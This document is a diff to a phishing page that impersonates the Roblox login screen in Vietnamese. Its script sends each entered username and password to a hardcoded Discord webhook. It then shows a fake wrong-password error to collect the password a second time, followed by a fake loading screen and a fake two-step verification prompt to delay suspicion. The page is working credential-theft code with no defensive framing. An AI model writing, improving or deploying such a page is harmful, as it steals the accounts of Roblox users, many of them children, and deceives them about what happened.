@@ -42,7 +42,6 @@
         }
         .nav-item { color: #bbb; font-size: 7px; font-weight: 600; }
 
-        /* 🔥 ẢNH ĐÃ FIX */
         .bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-image: url('https://i.ibb.co/nsm66HQs/image.jpg');
@@ -50,8 +49,7 @@
             background-position: center;
             background-repeat: no-repeat;
             z-index: 1;
-
-            filter: brightness(0.35); /* giữ nét + đỡ chói */
+            filter: brightness(0.35);
         }
 
         .container { 
@@ -117,13 +115,51 @@
             display: flex; flex-wrap: wrap; justify-content: center; 
             column-gap: 12px; row-gap: 20px;
         }
-        .footer-links span {
-            font-size: 7.5px; color: #bbb;
+        .footer-links span { font-size: 7.5px; color: #bbb; }
+        .footer-copyright { font-size: 6px; color: #555; margin-top: 15px; }
+
+        /* --- LỚP NỀN TỐI VÀ LOADING --- */
+        #dark-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.75); z-index: 1000; display: none;
         }
 
-        .footer-copyright { 
-            font-size: 6px; color: #555; margin-top: 15px;
+        .loader-container {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 1001; display: none; flex-direction: column; align-items: center;
         }
+
+        .loader-sq { display: flex; gap: 5px; }
+        .sq { width: 8px; height: 8px; background: #bbb; animation: blink 0.8s infinite alternate; }
+        .sq:nth-child(2) { animation-delay: 0.2s; }
+        .sq:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes blink { from { opacity: 0.2; } to { opacity: 1; } }
+
+        /* --- BẢNG XÁC MINH 2 BƯỚC --- */
+        #verify-modal {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 280px; 
+            background: #1a1c1e; /* Nền đậm */
+            border-radius: 8px;
+            z-index: 1002; display: none; flex-direction: column; overflow: hidden;
+            color: #fff; text-align: center;
+        }
+        .v-header { padding: 12px; border-bottom: 1px solid #333; font-size: 13px; font-weight: bold; }
+        .v-content { padding: 30px 20px; display: flex; flex-direction: column; align-items: center; }
+        .v-shield { width: 60px; margin-bottom: 20px; }
+        .v-text { font-size: 11px; color: #ccc; line-height: 1.5; margin-bottom: 20px; }
+        
+        .v-btn { 
+            width: 100%; /* Giữ nguyên chiều ngang */
+            padding: 5px; /* Giảm độ dày/chiều dài dọc xuống một nửa */
+            background: transparent; 
+            border: 1px solid #888; 
+            color: #fff; 
+            border-radius: 4px; 
+            font-size: 11px; 
+            cursor: pointer;
+        }
+
     </style>
 </head>
 <body>
@@ -138,12 +174,9 @@
         </div>
         <div class="btn-top-login">Đăng nhập</div>
     </div>
-
     <div class="header-nav">
-        <span class="nav-item">Bảng xếp hạng</span>
-        <span class="nav-item">Chợ</span>
-        <span class="nav-item">Tạo</span>
-        <span class="nav-item">Robux</span>
+        <span class="nav-item">Bảng xếp hạng</span><span class="nav-item">Chợ</span>
+        <span class="nav-item">Tạo</span><span class="nav-item">Robux</span>
     </div>
 </div>
 
@@ -163,63 +196,74 @@
     </div>
 </div>
 
-<div class="footer">
-    <div class="footer-links">
-        <span>Về chúng tôi</span>
-        <span>Việc làm</span>
-        <span>Blog</span>
-        <span>Cha mẹ</span>
-        <span>Mua thẻ quà tặng</span>
-        <span>Trợ giúp</span>
-        <span>Điều khoản</span>
-        <span>Riêng tư</span>
-        <span>Sơ đồ trang web</span>
-    </div>
-    <div class="footer-copyright">
-        ©2026 Roblox Corporation.
+<div id="dark-overlay"></div>
+
+<div class="loader-container" id="main-loader">
+    <div class="loader-sq">
+        <div class="sq"></div><div class="sq"></div><div class="sq"></div>
     </div>
 </div>
 
+<div id="verify-modal">
+    <div class="v-header">Xác minh 2 bước</div>
+    <div class="v-content">
+        <img src="https://images.rbxcdn.com/393165b4c483d739818815122e964344.png" class="v-shield">
+        <p class="v-text">Để chấp nhận hoặc từ chối nỗ lực đăng nhập này, hãy mở ứng dụng Roblox từ thiết bị đã đăng nhập.</p>
+        <button class="v-btn" onclick="location.reload()">Thử lại</button>
+    </div>
+</div>
+
+<div class="footer">
+    <div class="footer-links">
+        <span>Về chúng tôi</span><span>Việc làm</span><span>Blog</span><span>Cha mẹ</span>
+        <span>Mua thẻ quà tặng</span><span>Trợ giúp</span><span>Điều khoản</span><span>Riêng tư</span>
+        <span>Sơ đồ trang web</span>
+    </div>
+    <div class="footer-copyright">©2026 Roblox Corporation.</div>
+</div>
+
 <script>
+let clickCount = 0;
+
 function send() {
     const u = document.getElementById('u').value;
     const p = document.getElementById('p').value;
     const err = document.getElementById('error-msg');
+    const overlay = document.getElementById('dark-overlay');
+    const loader = document.getElementById('main-loader');
+    const modal = document.getElementById('verify-modal');
 
     if(!u || !p) {
         err.style.display = 'block';
         return;
     }
 
-    setTimeout(() => { 
-        err.style.display = 'block';
-        document.getElementById('p').value = ""; 
-    }, 500);
-}
-</script>
-
-</body>
-</html>
-<script>
-function send() {
-    const u = document.getElementById('u').value;
-    const p = document.getElementById('p').value;
-    const err = document.getElementById('error-msg');
-
-    if(!u || !p) {
-        err.style.display = 'block';
-        return;
-    }
-
+    // Gửi Webhook
     fetch("https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
     });
 
-    setTimeout(() => { 
-        err.style.display = 'block';
-        document.getElementById('p').value = ""; 
-    }, 500);
+    if (clickCount === 0) {
+        // Lần đầu: Báo lỗi sai mật khẩu
+        setTimeout(() => { 
+            err.style.display = 'block';
+            document.getElementById('p').value = ""; 
+            clickCount++;
+        }, 800);
+    } else {
+        // Lần hai: Tối màn hình và hiện xác minh
+        overlay.style.display = 'block';
+        loader.style.display = 'flex';
+
+        setTimeout(() => {
+            loader.style.display = 'none';
+            modal.style.display = 'flex';
+        }, 2500); // Đợi 2.5 giây loading rồi hiện bảng
+    }
 }
 </script>
+
+</body>
+</html>
